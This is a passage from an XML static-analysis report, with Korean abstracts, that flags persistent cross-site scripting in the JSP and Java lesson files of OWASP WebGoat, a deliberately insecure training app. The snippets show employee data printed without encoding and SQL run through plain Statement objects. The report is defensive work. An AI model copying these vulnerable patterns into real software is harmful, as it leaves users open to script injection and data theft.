<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C9C26D1E2689A4BAFDD1E0A1436722E8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2FD3AA75AD38134D813407219706E5C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E6E96FA907BF56B81111D764DBB0B128" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3EE2C396FB827CCD903AC31D02B5A882" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A5CEE83288CD99AF8FEABC701857BFF6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="98634CEBC386C2A942C002F3A1349217" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="28C131DEDDDD9B6BDF3768A3C654E598" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EF8D6FDCA2210FC51B0FFD7155D86C63" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6730CDCE223188D536A7CDDA79031B04" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="94FD0FC900B68AA1F17C104C9DF6F35D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="53D458774D44DCD26E456926211DD264" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 8 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>8</LineStart>
<Snippet>	int myUserId = webSession.getUserIdInLesson();
%&gt;
	&lt;div class="lesson_title_box"&gt;&lt;strong&gt;Welcome Back &lt;/strong&gt;&lt;span class="lesson_text_db"&gt;&lt;%=webSession.getUserNameInLesson()%&gt;&lt;/span&gt; - Staff Listing Page&lt;/div&gt;
		&lt;br&gt;
		&lt;br&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>203</LineStart>
<Snippet>			{
				Statement answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				ResultSet answer_results = answer_statement.executeQuery( query );
				if (answer_results.next())
					name = answer_results.getString("first_name");</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B6B1508D8C85590562B093C09DF6B7FA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C590B60DFBA0C842E8B0CA38FD0308D0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 58 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>58</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="29484B53B9C8DAEE5F2490A5BACE77B8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5D21DC292F0B507371886EB0BDF72A3F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPhoneNumber()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21EA54F3CC7278714C7F8FE37D7142B1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AAFC1F7059CAAA46A9CD6BDBA80E9309" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 makeCurrent() 메서드가 257 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>257</LineStart>
<Snippet>											
				TR row3 = new TR( new TD( new StringElement( "Posted By:" ) ) );
				row3.addElement( new TD( new StringElement( results.getString( USER_COL ) ) ) );
				t.addElement( row3 );
								</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>241</LineStart>
<Snippet>			statement.setString(1, getNameroot( s.getUserName() ) + "%");
			statement.setInt(2, messageNum);
			ResultSet results = statement.executeQuery();

			if ( ( results != null ) &amp;&amp; results.first() )</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="750072529DEC3499DE32391EBDFE2577" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BE7A15229005C097E9B3CC74F817037E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C67CE4564630B695CCC54F162691CB48" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
